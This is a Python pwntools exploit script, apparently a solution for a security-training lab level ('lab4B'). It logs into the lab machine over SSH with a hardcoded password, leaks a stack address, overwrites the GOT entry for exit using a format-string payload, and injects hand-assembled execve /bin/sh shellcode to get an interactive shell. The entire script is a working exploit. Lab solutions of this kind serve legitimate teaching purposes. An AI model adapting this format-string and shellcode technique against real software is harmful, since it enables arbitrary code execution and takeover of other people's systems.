#!/usr/bin/env python
from pwn import *

chal = '4B'
password = "bu7_1t_w4sn7_brUt3_f0rc34b1e!"

host = 'exploit-vm'
user = 'lab%s' % chal
level, grade = int(chal[:-1]), chal[-1]
binary = '/levels/lab{:02d}/lab{}'.format(level, chal)

shell = ssh(host=host, user=user, password=password)


def send_fmt(data):
    r = shell.run(binary)
    r.sendline(data)
    return r
    return r.recvall()


# .GOT entry for EXIT
exit_got_pointer = 0x080499b8

# Read a stack address to position of the stack
memory_base = u32(unhex(send_fmt("%5$x").recvall()), endian="big")
log.success("Found position on stack: %s", hex(memory_base))

# Locate our format string input in the stack
input_buffer_location = memory_base - 0x20
log.info("Input buffer location: %s", hex(input_buffer_location))

shellcode_position = 64  # Adjust this if format string length changes
shellcode_location = input_buffer_location + shellcode_position
log.info("Shellcode location: %s", hex(shellcode_location))


# We want to overwrite the exit_got_pointer to 0xbffffc18 which is
# in our format string. The offset will be different for each environment!!
format_string = "".join([
    p32(exit_got_pointer),
    p32(exit_got_pointer+0x1),
    p32(exit_got_pointer+0x2),
    p32(exit_got_pointer+0x3),
    "%{}x".format(0x118-16),
    "%6$n",
    "%{}x".format(0x1fc-0x118),
    "%7$n",
    "%{}x".format(0x2ff-0x1fc),
    "%8$n",
    "%{}x".format(0x3bf-0x2ff),
    "%9$n",
])

# Alternative: Use Pwntools to generate format string with correct offset
# on the fly.
# writes = {exit_got_pointer: shellcode_location}
# format_string = fmtstr_payload(6, writes)


log.info("Format string length: %d", len(format_string))
if shellcode_position <= len(format_string):
    log.warning("Fix the format string length or we'll miss the shellcode")

# /bin/sh shellcode
shellcode = "".join([
    asm("push 0x68"),
    asm("push 0x732f2f2f"),
    asm("push 0x6e69622f"),
    asm("push (SYS_execve)"),

    # The assembly for "pop eax" is 0x58 (X). This uppercase letter will
    # be is converted to lowercase by the program, which would break our
    # shell code. We use the following two ops which are functionaly equivilent
    asm("mov eax, DWORD PTR [esp]"),
    asm("add esp, 4"),

    asm("mov ebx, esp"),
    asm("xor ecx, ecx"),
    asm("cdq"),  # edx=0
    asm("int 0x80"),
])

# A small ROP chain because I don't want to bother with maths
format_string += "\x90" * 12
format_string += shellcode

log.info("Total payload length: %d", len(format_string))

# Send format string exploit
log.info("Sending the format string payload")
r = send_fmt(format_string)
r.clean()

r.sendline("id")
log.success("Got a shell!")
r.interactive()
